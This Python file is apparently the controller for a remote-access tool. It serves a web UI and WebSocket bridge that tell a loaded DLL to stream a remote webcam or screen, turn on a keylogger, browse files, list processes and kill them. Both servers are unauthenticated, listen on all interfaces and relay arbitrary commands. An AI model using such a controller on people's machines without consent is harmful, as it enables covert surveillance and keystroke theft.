# client/webapp.py
# Web UI + integrated lightweight WebSocket bridge (no external libs)
import http.server
import socketserver
import os
import json
import ctypes
import threading
import time
import socket
import sys
import base64
import hashlib
import struct

# ---------------- CONFIG ----------------
HTTP_PORT = 8000
WS_PORT = 8888
BASE_DIR = os.path.dirname(os.path.abspath(__file__))  # client/
DLL_PATH = os.path.join(BASE_DIR, "client.dll")
WEBCAM_JPG = os.path.join(BASE_DIR, "webcam.jpg")
APPS_TXT = os.path.join(BASE_DIR, "apps.txt")

# ---------------- GLOBALS ----------------
webcam_running = False
lib = None
lib_lock = threading.Lock()  # guard calls to lib if needed

# ---------------- LOAD DLL ----------------
try:
    if os.path.exists(DLL_PATH):
        lib = ctypes.CDLL(DLL_PATH)
        try:
            lib.InitWinsock.restype = None
        except: pass
        print(f"-> [SYSTEM] Loaded DLL: {DLL_PATH}")
    else:
        print(f"-> [WARNING] DLL not found at: {DLL_PATH} (expected)")
except Exception as e:
    print(f"-> [ERROR] Loading DLL failed: {e}")
    lib = None

# optional auto connect attempt (safe)
if lib:
    try:
        try:
            lib.InitWinsock()
        except: pass
        # do NOT force connect here; bridge/HTTP can call ConnectToServer when needed
    except Exception as e:
        print(">> [DLL] Init error:", e)

# ---------------- Small helpers for WebSocket ----------------
WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

def build_ws_response_key(key):
    accept = base64.b64encode(hashlib.sha1((key + WS_GUID).encode('utf-8')).digest()).decode('utf-8')
    return accept

def recv_exact(conn, n):
    data = b''
    while len(data) < n:
        part = conn.recv(n - len(data))
        if not part:
            raise ConnectionError("socket closed")
        data += part
    return data

def read_ws_message(conn):
    # read 2 bytes header
    hdr = recv_exact(conn, 2)
    b1, b2 = hdr[0], hdr[1]
    fin = (b1 >> 7) & 1
    opcode = b1 & 0x0f
    masked = (b2 >> 7) & 1
    payload_len = b2 & 0x7f

    if payload_len == 126:
        ext = recv_exact(conn, 2)
        payload_len = struct.unpack(">H", ext)[0]
    elif payload_len == 127:
        ext = recv_exact(conn, 8)
        payload_len = struct.unpack(">Q", ext)[0]

    mask_key = b''
    if masked:
        mask_key = recv_exact(conn, 4)

    payload = recv_exact(conn, payload_len) if payload_len > 0 else b''

    if masked and payload_len > 0:
        unmasked = bytearray(payload_len)
        for i in range(payload_len):
            unmasked[i] = payload[i] ^ mask_key[i % 4]
        payload = bytes(unmasked)

    # Only handle text (opcode 1) and close (8)
    if opcode == 1:
        try:
            return payload.decode('utf-8', errors='ignore')
        except:
            return ''
    elif opcode == 8:
        raise ConnectionError("Client requested close")
    else:
        # ignore other opcodes
        return ''

def send_ws_message(conn, text):
    payload = text.encode('utf-8')
    header = bytearray()
    header.append(0x81)  # FIN + text frame
    l = len(payload)
    if l < 126:
        header.append(l)
    elif l < (1 << 16):
        header.append(126)
        header.extend(struct.pack(">H", l))
    else:
        header.append(127)
        header.extend(struct.pack(">Q", l))
    conn.sendall(header + payload)

# ---------------- WebSocket bridge (no external libs) ----------------
def ws_client_thread(conn, addr):
    try:
        # perform handshake: read HTTP headers
        data = b''
        while b'\r\n\r\n' not in data:
            chunk = conn.recv(4096)
            if not chunk:
                conn.close(); return
            data += chunk
            if len(data) > 65536: break
        headers = data.decode('utf-8', errors='ignore').split('\r\n')
        key = None
        for h in headers:
            if h.lower().startswith('sec-websocket-key:'):
                key = h.split(':',1)[1].strip()
                break
        if not key:
            conn.close(); return

        accept = build_ws_response_key(key)
        resp = (
            "HTTP/1.1 101 Switching Protocols\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Accept: {accept}\r\n"
            "\r\n"
        )
        conn.sendall(resp.encode('utf-8'))
        print("[WS] Handshake done:", addr)

        # main loop: read text frames
        while True:
            try:
                msg = read_ws_message(conn)
            except ConnectionError:
                break
            if not msg:
                continue
            msg = msg.strip()
            print("[WS recv]:", msg)
            # handle CONNECT command optionally with ip port
            parts = msg.split()
            cmd_upper = parts[0].upper() if parts else ''
            if cmd_upper == "CONNECT":
                target_ip = b"127.0.0.1"
                target_port = 5656
                if len(parts) >= 3:
                    try:
                        target_ip = parts[1].encode('utf-8')
                        target_port = int(parts[2])
                    except:
                        pass
                if lib:
                    try:
                        with lib_lock:
                            ok = lib.ConnectToServer(target_ip, target_port)
                        if ok:
                            send_ws_message(conn, "Bridge OK")
                        else:
                            send_ws_message(conn, "Bridge FAIL")
                    except Exception as e:
                        print("[WS] ConnectToServer error:", e)
                        send_ws_message(conn, "Bridge ERR")
                else:
                    send_ws_message(conn, "NO_DLL")
                continue

            # For other text, send to DLL via SendStringCmd (if available)
            if lib:
                try:
                    with lib_lock:
                        # ensure bytes
                        lib.SendStringCmd(msg.encode('utf-8'))
                    send_ws_message(conn, "SENT:"+msg)
                except Exception as e:
                    print("[WS] SendStringCmd error:", e)
                    send_ws_message(conn, "ERROR_SEND")
            else:
                send_ws_message(conn, "NO_DLL")
        print("[WS] Client disconnected:", addr)
    except Exception as e:
        print("[WS] client thread exception:", e)
    finally:
        try: conn.close()
        except: pass

def ws_listen_thread():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', WS_PORT))
    s.listen(5)
    print(f"[WS] Bridge listening on 0.0.0.0:{WS_PORT}")
    while True:
        try:
            conn, addr = s.accept()
            t = threading.Thread(target=ws_client_thread, args=(conn, addr), daemon=True)
            t.start()
        except Exception as e:
            print("[WS] accept error:", e)
            time.sleep(1)

def wait_for_file(path, timeout=2.0, poll=0.05):
    """Chờ file path xuất hiện và có kích thước > 0 trong timeout giây. Trả True/False."""
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            if os.path.exists(path) and os.path.getsize(path) > 0:
                return True
        except Exception:
            pass
        time.sleep(poll)
    return False


# ---------------- MODE MANAGER (chèn vào webapp.py, top-level) ----------------
# modes: keys and human names
MODES = {
    "webcam": "Xem Webcam",
    "screen": "Xem Màn hình",
    "keylogger": "Keylogger",
    "notify": "Xem Thông báo",
    "files": "Quản lý File",
    "apps": "Apps đang chạy",
    "process": "Processes",
    "custom": "Tùy chọn"
}

# global current running mode
current_mode = None
mode_lock = threading.Lock()

def stop_current_mode():
    """Dừng mode hiện có an toàn (gửi STOP/QUIT hoặc làm việc tương ứng)."""
    global current_mode, webcam_running
    with mode_lock:
        if current_mode is None:
            return
        print(f"[MODE] Stopping current_mode: {current_mode}")
        try:
            # If webcam mode, set webcam_running False and ask STOP
            if current_mode == "webcam":
                webcam_running = False
                if lib:
                    with lib_lock:
                        lib.SendStringCmd(b"STOP")
                time.sleep(0.1)
            else:
                # generic stop command for other modes if needed
                if lib:
                    with lib_lock:
                        lib.SendStringCmd(b"STOP")
                time.sleep(0.05)
        except Exception as e:
            print("[MODE] stop_current_mode error:", e)
        current_mode = None

def start_mode(mode):
    """Start requested mode after ensuring previous stopped. Returns True/False."""
    global current_mode, webcam_running
    with mode_lock:
        # if same mode requested, just return True
        if current_mode == mode:
            print("[MODE] start_mode: already in mode", mode)
            return True
        # stop any running mode first
        if current_mode is not None:
            stop_current_mode()
            # small delay to allow server free resources
            time.sleep(0.12)

        print("[MODE] Starting mode:", mode)
        # start specific actions
        try:
            if mode == "webcam":
                # send control, then start receive stream thread
                if lib:
                    with lib_lock:
                        lib.SendStringCmd(b"WEBCAM")
                        time.sleep(0.02)
                        lib.SendStringCmd(b"START")
                    # launch receive thread
                    t = threading.Thread(target=lib.ReceiveWebcamStream, daemon=True)
                    t.start()
                    webcam_running = True
                else:
                    print("[MODE] No DLL to start webcam")
                    return False

            elif mode == "screen":
                # send SCREEN command (server expected to stream screenshot -> maybe file or another endpoint)
                if lib:
                    with lib_lock:
                        lib.SendStringCmd(b"SCREEN")
                        # server may write screenshot file; adapt if needed
                else:
                    return False

            elif mode == "keylogger":
                if lib:
                    with lib_lock:
                        lib.SendStringCmd(b"KEYLOGGER_ON")
                else:
                    return False

            elif mode == "notify":
                if lib:
                    with lib_lock:
                        lib.SendStringCmd(b"NOTIFY")
                else:
                    return False

            elif mode == "files":
                if lib:
                    with lib_lock:
                        lib.SendStringCmd(b"EXPLORER")
                else:
                    return False

            elif mode == "apps":
                # start "apps" which uses GetAppList (we stop stream before calling in route)
                # here nothing to start persistently; just mark mode so UI knows current
                pass

            elif mode == "process":
                if lib:
                    with lib_lock:
                        lib.SendStringCmd(b"PROCESS")
                else:
                    return False

            elif mode == "custom":
                # placeholder
                pass
            else:
                print("[MODE] Unknown mode:", mode)
                return False

            current_mode = mode
            return True
        except Exception as e:
            print("[MODE] start_mode exception:", e)
            return False

# Insert into existing IoTRequestHandler.do_POST handling:
# Add case for '/api/mode' where client sends JSON: {"mode":"webcam"}
# And for GET /api/mode to return {"mode": current_mode}


# ---------------- HTTP handler (same as patched) ----------------
class ThreadingTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    daemon_threads = True
    allow_reuse_address = True

class IoTRequestHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, fmt, *args):
        sys.stdout.write("[HTTP] " + (fmt % args) + "\n")

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    # --- Thay thế toàn bộ method do_GET bằng đoạn này ---
    def do_GET(self):
        global webcam_running
        # --- API: lấy danh sách apps (gọi GetAppList + chờ apps.txt) ---
        if self.path == '/api/mode':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"mode": current_mode}).encode())
            return
    
        elif self.path == '/api/list_apps':
            print("[HTTP] GET /api/list_apps (calling GetAppList & waiting for file)")
            apps = []
            if lib:
                try:
                    with lib_lock:
                        lib.GetAppList()
                    # chờ tối đa 2s để C++ ghi apps.txt
                    ok = wait_for_file(APPS_TXT, timeout=2.0)
                    if not ok:
                        print("[HTTP] Warning: apps.txt not ready after GetAppList()")
                except Exception as e:
                    print("[HTTP] lib.GetAppList error:", e)

            # đọc file apps.txt (nếu có)
            try:
                if os.path.exists(APPS_TXT):
                    with open(APPS_TXT, "r", encoding="utf-8", errors="ignore") as f:
                        for line in f:
                            p = line.strip().split('|')
                            if len(p) >= 3:
                                apps.append({"id": p[0], "name": p[1], "threads": p[2]})
                else:
                    print("[HTTP] apps.txt not found (GetAppList may have failed).")
            except Exception as e:
                print("[HTTP] read apps.txt error:", e)

            # trả JSON (mảng rỗng nếu không có)
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(apps).encode())
            return

        # --- Video stream MJPEG từ webcam.jpg ---
        elif self.path == '/video_feed':
            print("[HTTP] GET /video_feed (stream)")
            self.send_response(200)
            self.send_header('Content-type', 'multipart/x-mixed-replace; boundary=frame')
            self.end_headers()
            try:
                while True:
                    if os.path.exists(WEBCAM_JPG):
                        try:
                            with open(WEBCAM_JPG, "rb") as f:
                                img = f.read()
                            # gửi frame
                            self.wfile.write(b'--frame\r\n')
                            self.wfile.write(b'Content-Type: image/jpeg\r\n\r\n')
                            self.wfile.write(img)
                            self.wfile.write(b'\r\n')
                        except (BrokenPipeError, ConnectionResetError):
                            # client đóng kết nối
                            break
                        except Exception as e:
                            print("[HTTP] frame error:", e)
                    else:
                        # không có file: đợi 0.1s rồi tiếp tục
                        pass
                    time.sleep(0.1)
            except Exception as e:
                print("[HTTP] /video_feed exception:", e)
            return

        # mặc định: phục vụ file tĩnh / index
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        global webcam_running
        print("[HTTP] POST", self.path)

        # ---- Start webcam
        if self.path == '/api/webcam/start':
            if not webcam_running:
                webcam_running = True
                if lib:
                    try:
                        # --- 1) gửi control lệnh trước (WEBCAM then START) ---
                        try:
                            with lib_lock:
                                lib.SendStringCmd(b"WEBCAM")
                            time.sleep(0.05)
                            try:
                                with lib_lock:
                                    lib.SendStringCmd(b"START")
                            except Exception as e:
                                print("[API] Warning: SendStringCmd START failed:", e)
                            print("[API] Sent WEBCAM + START commands (if supported).")
                        except Exception as e:
                            print("[API] Warning: SendStringCmd WEBCAM failed:", e)

                        # --- 2) start receive stream thread (non-blocking) ---
                        t_stream = threading.Thread(target=lib.ReceiveWebcamStream, daemon=True)
                        t_stream.start()
                        print("[API] Started DLL.ReceiveWebcamStream thread (after WEBCAM/START).")

                    except Exception as e:
                        print("[API] Failed to start ReceiveWebcamStream:", e)
                else:
                    print("[API] No DLL loaded - cannot start webcam.")

                # --- 3) start monitor thread to ensure webcam.jpg is being updated ---
                def webcam_monitor():
                    max_retries = 4
                    retry = 0
                    last_size = 0
                    last_time = time.time()
                    # initial wait for file appearance
                    if not wait_for_file(WEBCAM_JPG, timeout=3.0):
                        print("[MON] webcam.jpg not created within 3s after start.")
                    # loop until stopped or retries exceeded
                    while webcam_running and retry <= max_retries:
                        try:
                            if os.path.exists(WEBCAM_JPG):
                                size = os.path.getsize(WEBCAM_JPG)
                                if size != last_size:
                                    last_size = size
                                    last_time = time.time()
                                else:
                                    # no new frame for threshold -> attempt restart
                                    if time.time() - last_time > 3.0:
                                        retry += 1
                                        print(f"[MON] No new frame for 3s (retry {retry}/{max_retries}). Attempt restart.")
                                        # attempt graceful stop then restart
                                        try:
                                            with lib_lock:
                                                lib.SendStringCmd(b"STOP")
                                            time.sleep(0.15)
                                        except Exception as e:
                                            print("[MON] Send STOP err:", e)
                                        try:
                                            t2 = threading.Thread(target=lib.ReceiveWebcamStream, daemon=True)
                                            t2.start()
                                            print("[MON] Restarted ReceiveWebcamStream thread.")
                                        except Exception as e:
                                            print("[MON] Restart err:", e)
                                        last_time = time.time()
                            else:
                                # file missing -> maybe not yet created. attempt small restart if delayed
                                if time.time() - last_time > 3.0:
                                    retry += 1
                                    print(f"[MON] webcam.jpg still missing after start (retry {retry}/{max_retries}); restarting ReceiveWebcamStream.")
                                    try:
                                        t3 = threading.Thread(target=lib.ReceiveWebcamStream, daemon=True)
                                        t3.start()
                                    except Exception as e:
                                        print("[MON] Restart err (missing file):", e)
                                    last_time = time.time()
                            time.sleep(0.5)
                        except Exception as e:
                            print("[MON] monitor exception:", e)
                            time.sleep(0.5)

                    if not webcam_running:
                        print("[MON] webcam monitor stopping because webcam_running=False")
                    else:
                        print("[MON] webcam monitor giving up after retries.")
                threading.Thread(target=webcam_monitor, daemon=True).start()

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
            return
        
        # Mode control
        elif self.path == '/api/mode':
            length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(length) if length > 0 else b''
            try:
                payload = json.loads(data.decode('utf-8'))
                mode = payload.get('mode')
            except:
                mode = None
            if not mode:
                self.send_response(400); self.end_headers(); self.wfile.write(b"Bad mode"); return

            if mode not in MODES:
                self.send_response(400); self.end_headers(); self.wfile.write(b"Unknown mode"); return

            # start requested mode safely
            ok = start_mode(mode)
            if ok:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(json.dumps({"ok": True, "mode": mode}).encode())
            else:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(json.dumps({"ok": False}).encode())
            return
        
        # ---- Stop webcam
        elif self.path == '/api/webcam/stop':
            webcam_running = False
            if lib:
                try:
                    with lib_lock:
                        # use STOP (matches main.py behavior) to gracefully stop streaming
                        lib.SendStringCmd(b"STOP")
                    print("[API] Sent STOP to DLL.")
                except Exception as e:
                    print("[API] Send STOP error:", e)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
            return

        # ---- Kill process (body JSON {pid: "1234"})
        elif self.path == '/api/kill':
            length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(length) if length > 0 else b''
            pid = None
            try:
                payload = json.loads(data.decode('utf-8'))
                pid = payload.get('pid')
            except Exception:
                try:
                    pid = data.decode('utf-8')
                except:
                    pid = None
            if pid and lib:
                try:
                    with lib_lock:
                        lib.KillProcess(pid.encode('utf-8'))
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps({"ok": True}).encode())
                except Exception as e:
                    print("[API] KillProcess error:", e)
                    self.send_response(500)
                    self.end_headers()
                    self.wfile.write(str(e).encode())
            else:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(b"Bad Request or DLL not loaded")
            return

        else:
            self.send_error(404)
            return

# ---------------- RUN BOTH HTTP + WS ----------------
def run_http_server():
    os.chdir(BASE_DIR)
    print("CWD ->", os.getcwd())
    with ThreadingTCPServer(("0.0.0.0", HTTP_PORT), IoTRequestHandler) as httpd:
        print(f"-> [WEB UI] Access: http://localhost:{HTTP_PORT}")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("Shutting down HTTP server...")

if __name__ == "__main__":
    # start ws bridge thread
    t = threading.Thread(target=ws_listen_thread, daemon=True)
    t.start()
    print("[MAIN] Started WS bridge thread (port {})".format(WS_PORT))
    print("\n--- STARTING WEBAPP (with built-in WS bridge) ---")
    run_http_server()
